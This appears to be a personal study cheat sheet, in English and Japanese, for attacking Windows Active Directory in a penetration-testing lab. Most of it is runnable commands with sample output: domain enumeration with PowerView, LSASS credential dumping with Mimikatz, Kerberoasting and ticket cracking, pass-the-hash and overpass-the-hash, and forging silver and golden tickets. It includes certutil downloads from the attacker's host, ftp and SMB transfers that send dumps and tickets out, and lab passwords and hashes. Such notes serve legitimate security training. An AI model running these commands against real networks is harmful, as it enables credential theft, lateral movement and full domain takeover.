# Remote Desk Top
specifying domain with `-d` flag may be important

```
rdesktop -d corp -u offsec -p lab 192.168.160.10

xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
```


# Domain Name and Domain Controller Name
## Show Domain-Name And Windows-User-Name

```set user```

(Domain-Name = USERDOMAIN, USERNAME = Windows-Users-Name)

## Show Domain-Controller's Name And Domain-Name

現在ログインし ているユーザの Domain オブジェクトを取得。

```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()```

`Name`プロパティが「ドメイン名」、`PdcRoleOwner`が「プライマリドメインコントローラ名」。


# Users And Groups
## List Local Accounts
```net user ```

## List All Users In Domain
```net user /domain```

## Show Each User's Info
```net user <username> /domain```

## List All Groups In Domain
```net group /domain```


# Enum All Users And Services

```
C:\> powershell -ep bypass

PS> Import-Module PowerView.ps1
PS> Get-NetUser
```

または

```
PS> . .\PowerView.ps1
```


(certutil -URLcache -f http://<Kali's IP>/enum_users.ps1 enum_users.ps1)

```PS > powershell -ep bypass .\enum_users.ps1```

# Curret Logged In Users And Active Sessions

> NetWkstaUserEnum API を使用して Windows 10 クライアントマシン上のローカルユーザを列挙し、NetSessionEnum を使用し てドメインコントローラ上のユーザのアクティブセッションを列挙します。

(certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)

```PS> powershell -ep bypass Import-Module .\PowerView.ps1
```

## Show Current Logged In Users

まず、Get-NetLoggedon でログインユーザを列挙する際に、対象となるワークステーショ ンやサーバを指定するために-ComputerName オプションを使います。ここでは Windows 10 クライアントを対象としているので、-ComputerName client251 とします。

(Computer name "client251", `hostname` command tells you your computer name)

```PS> Get-NetLoggedon -ComputerName client251```

## Show All Activated Sessions

ドメインコントローラ DC01 上のアクティブなセッションを取得してみましょう。

```PS> Get-NetSession -ComputerName dc01```

 (Probably, dc01 is Doamin Controller (it's ok not to specify "dc01"))

（Domain Admins の一人を侵害することに成功すれば、最終的にはドメイン全体を乗っ取ることができます)

> グループメンバーシップを列挙し、ユーザが現在ログインしているマシンを特定できるよ うになったので、ユーザアカウント侵害を開始するために必要な基本スキルを身につける ことができました。最終目的はドメイン管理者権限の獲得です。


# LSASS Attack (Local Security Authority Subsystem Service)

（Microsoft の Kerberos の実装ではシングルサインオンを採用しているため、TGT 要求を更新するためにパスワードハッシュをどこかに保存しておく必要がある）
（シングルサインオン...1度ユーザー認証 (ログイン)を行うと、複数のシステムを利用開始する際に都度認証を行う必要がない仕組み）

## Using TaskManager
On Windows machine (that's to say open the Windows OS by remote desktop):
 start -> WindowsSystem -> taskmanager -> Details -> right click the lsass.exe -> Create dump file (e.g. C:\Users\admin\AppData\Local\Temp\lsass.DMP)

At command prompt:
```> ftp <kali IP address>
ftp> bin
ftp> put lsass.DMP
```

On Kali terminal:

```$ pypykatz lsa minidump lsass.DMP```

## Usin Mimikatz
 
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

（`sekurlsa::logonpasswords`はそこまで出力内容は変わらないが、`sekurlsa::logonpasswords`よりも冗長。あ、でもlogonpasswordsの方は”クリアパスワード”が出ることもある。）

[*]Try both TaksManager way and Mimikatz way. They probably result in different.

# Service Account Attacks (passwords of http, mysql, ftp...)
Abusing the SPN's ticket and cracking those service's accout passwords.

step.1: Get Service Tickets

```
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'
(PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com')
```

step.2: After the ticket was issued and loaded to memory, check it with `klist` command:

```
PS C:\> klist
#2>     Client: xor-app59$ @ XOR.COM
        Server: MSSQLSvc/xor-app23.xor.com:1433 @ XOR.COM
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 10/29/2021 7:23:46 (local)
        End Time:   10/29/2021 14:39:00 (local)
        Renew Time: 11/5/2021 4:39:00 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: xor-dc01.xor.com
```        

step.3: Download the ticket

```mimikatz # kerberos::list /export```

(After download, you can find .kirbi files in the current directory)

step.4: send to Kali (You can also use ftp bin put)

On kali:

```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .```

On Windows:

```copy 4-40a10000-xor-app59\$@HTTP\~ExchangeService.xor.com-XOR.COM.kirbi \\<kali's IPaddress>\kali\```

step.5: Cracking Tickets (on Kali)

Convert for using john:

```$ kirbi2john.py -o forjohn.txt 2-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi```

Cracking:

```$ john --format=krb5tgs forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt```

[*] When you connect with the password you got from the above method, be careful for "user name"

Not using john, but using kerberoast tgsrecrack.py:

```$ python /kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi```

# Kerberos認証
## AS_REQ
- タイムスタンプ
- ユーザ名
（ユーザのハッシュで暗号化）

## AS_REP
- セッションキー①（ユーザのパスワードハッシュで暗号化）
- TGT（KDCのみが知っている秘密鍵（= **krbtgtというドメインユーザアカウントのパスワードハッシュ**）で暗号化）

（TGTにはグループメンバーシップ、ドメイン、タイム スタンプ、クライアントの IP アドレス、セッションキー①等が含まれる）

ここまでで、クライアント認証が完了。  次に「サービスチケット」を得る。

## TGS_REQ
- ユーザ名、タイムスタンプ（セッションキー①で暗号化）、リソースのSPN
- TGT（KDCのみが知っている秘密鍵（＝krbtgtのパスワードハッシュ）で暗号化）

## TGS_REP
- サービスチケット（その中にはセッションキー②）

##AP_REQ
- ユーザ名、タイムスタンプ（セッションキー②で暗号化）
- サービスチケット



# Lateral Movement
## Pass The Hash
c.f.) https://book.hacktricks.xyz/pentesting/pentesting-smb

```
evil-winrm -i 10.11.1.121 -u sqlServer -p shantewhite

evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10

psexec.py alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe

psexec.py Administrator@10.10.3.190 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

## Over Pass The Hash

Overpass the hash673とは、NTLM のユーザハッシュを「オーバー」悪用して、完全な Kerberos の Ticket Granting Ticket(TGT)やサービスチケットを獲得することであり、これにより、 そのユーザとして別のマシンやサービスにアクセスすることが可能となります。

overpass the hash テクニックの本質は、NTLM ハッシュを Kerberos チケットに変換し、 NTLM 認証を回避することにあります。これを行なう簡単な方法は、やはり Mimikatz の sekurlsa::pth コマンドです。

Converting NTLM hash to TGT and get another user's shell. 

(That user's hash can be got by `sekurlsa::logonpasswords`.)

```mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe ```

<- I can execute commands on this PowerSHell as Jeff_Admin user

Generating TGT:

```
PS C:¥Windows¥system32> net use \\dc01
```

Now, NTLM hash was converted to Kerberos TGT. So we can use PsExec.exe!

> PsExec はリモートでコマンドを実行できますが、パスワードハッシュは受け付けません。 Kerberos チケットを生成し、Jeff_Admin のコンテキストの PowerShell セッションで操作 しているので、TGT を再利用してドメインコントローラ上でコード実行ができます。

```
PS C:¥Tools¥active_directory> .¥PsExec.exe ¥¥dc01 cmd.exe
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
C:¥Windows¥system32>
```

## Pass The Ticket
### Silver Ticket Crafting

> 特定のアカウントとしてService Ticketを偽造し、当該アカウントになりすまして特定サービスを利用する。

> 既に、サービスアカウントのパスワードハッシュをクラックし、サービスチケットからパス ワードを取得できることを示しました。このパスワードは、サービスアカウントで利用可能 なリソースにアクセスするために使用することができます。
しかし、そのサービスアカウントがいずれかのサーバのローカル管理者でない場合、pass the hash や overpass the hash のようなベクターを使ってラテラルムーブメントを行うことがで きないため、別の方法を使う必要があります。

> 
例えば、サービスアカウント iis_service のコンテキストで実行されている IIS サーバに対 して認証を行うと、サービスチケットに存在するグループメンバーシップに応じて、IIS サ ーバでどの権限を持つかを IIS アプリケーションが決定します。
しかし、サービスアカウントのパスワードまたはそれに関連する NTLM ハッシュがあれば、 独自のサービスチケットを作成し、ターゲットリソース(この例では IIS アプリケーション) に任意の権限でアクセスすることができます。このカスタムで作成したチケットは「シルバーチケット」と呼ばれる


（シルバーチケットの生成には、平文のパスワードではなくパスワードハッシュを使用します。）


```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

It may be possible to execute command with Silver Ticket:

```
#0> client: ...
    server: cifs/WIN2008R2.pentest.local@PENTEST.LOCAL
```

の場合

```
C:\> PsExec.exe \\win2008r2 whoami
```

(how to find SID)

```
C:¥>whoami /user
USER INFORMATION
----------------
User Name SID
=========== ============================================== 
corp¥offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```


### Golden Ticket Crafting
I make the original TGT namely **Golden Ticket**.

This needs **krbtgt's hash**.

Get the krbtgt's hash:

```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668 RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327 RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
```

Crafting the Golden Ticket:

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```

Get the shell:

`misc::cmd`will open a new command prompt with elevated privileges to all machines.

```
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
C:¥Users¥offsec.crop> psexec.exe ¥¥dc01 cmd.exe
PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com C:¥Windows¥system32> 
```

この**dc01**というのは、PowerViewの`Get-NetComputer`（<- Get a list of computers in current domain ）で表示されるような、他のマシンのこと。だから他のマシンのシェルを操作できるってこと！
